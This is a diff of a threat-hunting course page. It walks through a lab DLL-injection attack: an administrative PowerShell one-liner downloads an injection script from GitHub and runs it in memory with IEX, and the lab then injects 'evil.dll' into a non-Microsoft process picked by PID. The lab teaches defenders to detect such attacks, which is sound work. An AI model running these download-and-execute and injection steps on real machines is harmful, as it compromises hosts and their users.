@@ -749,7 +749,11 @@ The code as it currently stands on the original repo is however broken, at least
 
 The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).
 
-And so, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but `in no way whatsoever do I want to appear as taking any credit/ownership for it`. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 
+And so, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but `in no way whatsoever do I want to appear as taking any credit/ownership for it`. 
+
+{{< figure src="/img/notmine.gif" title="" class="custom-figure" >}}
+
+The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to [refer to them](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1) if you want. 
 
 **OK, so now let's go ahead and download + inject the script into memory:**
 1. On our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
@@ -759,16 +763,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ```
 - Note that after you run it there won't be any feedback/output. You see, PowerShell is rather stoic -  not receiving any feedback/output almost always means the command ran successfully. Conversely, if there was an error, you'll get some red text telling you what went wrong. 
 
-
-
-tk xxx cont here
-
-
-
-
-
-
-
+{{< figure src="/img/stoic.gif" title="" class="custom-figure" >}}
 
 # 2.3.5. Injecting Our Malicious DLL
 
@@ -776,15 +771,19 @@ Great so the script that will inject `evil.dll` into a process memory space is n
 
 We're about to do so, but before that there's one more thing we need. Remember in the beginning when I explained how DLL-injections work I said that we "trick" a legit process into running code from a malicious DLL? So this script we just injected into memory is what's going to be doing the trickery, we also have our malicious DLL which we transferred over, so that means we only need one more thing - a legit process.
 
+Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, this has become more complicated since Windows 10 since native applications will only load [MS-signed libraries](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g).
 
+{{< figure src="/img/charlie.gif" title="" class="custom-figure" >}}
 
+Though there are ways to circumvent this let's not overcomplicate things right now in this regard. Plus, it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, so I'll be running a random executable called `rufus.exe`. It's a small, simple program that creates bootable usb drives, but that's irrelevant - I really just arbitrarily chose it to have *some* non-MS process. 
 
+If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 
 
-Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)
+**Let's run our process and inject into it:**
 
-So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but that's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 
+1. Open `rufus.exe`, or whatever other non-MS application you chose. 
 
-3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
+2. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
 
 {{< figure src="/img/image048.png" title="" class="custom-figure" >}}
 
